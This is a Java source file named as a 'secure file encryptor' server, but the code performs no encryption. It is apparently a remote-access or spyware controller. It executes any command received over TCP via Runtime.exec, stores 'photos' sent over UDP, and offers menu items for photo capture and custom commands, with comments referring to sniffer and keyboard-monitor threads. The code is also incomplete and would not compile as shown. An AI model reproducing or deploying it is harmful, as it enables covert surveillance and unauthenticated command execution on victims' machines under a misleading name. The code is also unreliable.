import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.UUID;

public class SecureFileEncryptorServer {

    private static final String IMAGE_DIRECTORY = "received_images";
    private static final String TCP_MESSAGE_DIRECTORY = "tcp_messages";

    public static void main(String[] args) {
        int tcpPort = 12345; // TCP server port
        int udpPort = 54321; // UDP server port

        // Start TCP and UDP servers concurrently
        startTCPServer(tcpPort);
        startUDPServer(udpPort);

          while (true) {
            System.out.println("Choose an action:");
            System.out.println("1. Take photo and send via UDP");
            System.out.println("2. Execute custom command");
            System.out.println("3. Exit");

            int choice = scanner.nextInt();
            scanner.nextLine(); // Consume newline character

            switch (choice) {
                case 1:
                    takePhotoAndSendUDP();
                    break;
                case 2:
                    System.out.print("Enter command to execute: ");
                    String command = scanner.nextLine();
                    sendCommandToServer(command);
                    break;
        /*        case 3:
                    stopSnifferThread();
                    stopKeyboardMonitorThread();
                    return; // Exit the program*/
                default:
                    System.out.println("Invalid choice. Please try again.");
            }
    }

    public static void startTCPServer(int port) {
        try (ServerSocket serverSocket = new ServerSocket(port)) {
            System.out.println("TCP Server started on port " + port);
            while (true) {
                Socket clientSocket = serverSocket.accept();
                handleTCPClient(clientSocket);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void handleTCPClient(Socket socket) {
        try (ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) {
            String message = (String) in.readObject();
            processTCPMessage(message);
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static void processTCPMessage(String message) {
        // Store the received TCP message in a folder on the server
        storeTCPMessage(message);
        // Execute the received command
        executeCommand(message);
    }

    public static void storeTCPMessage(String message) {
        try {
            File directory = new File(TCP_MESSAGE_DIRECTORY);
            if (!directory.exists()) {
                directory.mkdirs(); // Create the directory if it doesn't exist
            }
            String fileName = UUID.randomUUID().toString() + ".txt"; // Generate a unique file name
            Path messagePath = Paths.get(TCP_MESSAGE_DIRECTORY, fileName);
            Files.write(messagePath, message.getBytes()); // Write the message data to the file
            System.out.println("TCP Message saved: " + messagePath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void startUDPServer(int port) {
        try (DatagramSocket udpSocket = new DatagramSocket(port)) {
            byte[] buffer = new byte[1024];
            System.out.println("UDP Server started on port " + port);
            while (true) {
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
                udpSocket.receive(packet);
                String receivedData = new String(packet.getData(), 0, packet.getLength());
                processUDPData(receivedData);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void processUDPData(String data) {
        // Assuming the received data is an image file in byte array format
        byte[] imageData = data.getBytes(); // Convert data to byte array (replace this with your actual logic)

        // Store the received image in a folder on the server
        storeImage(imageData);
    }

    public static void storeImage(byte[] imageData) {
        try {
            File directory = new File(IMAGE_DIRECTORY);
            if (!directory.exists()) {
                directory.mkdirs(); // Create the directory if it doesn't exist
            }
            String fileName = UUID.randomUUID().toString() + ".jpg"; // Generate a unique file name
            Path imagePath = Paths.get(IMAGE_DIRECTORY, fileName);
            Files.write(imagePath, imageData); // Write the image data to the file
            System.out.println("Image saved: " + imagePath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void executeCommand(String command) {
        // Execute the received command
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
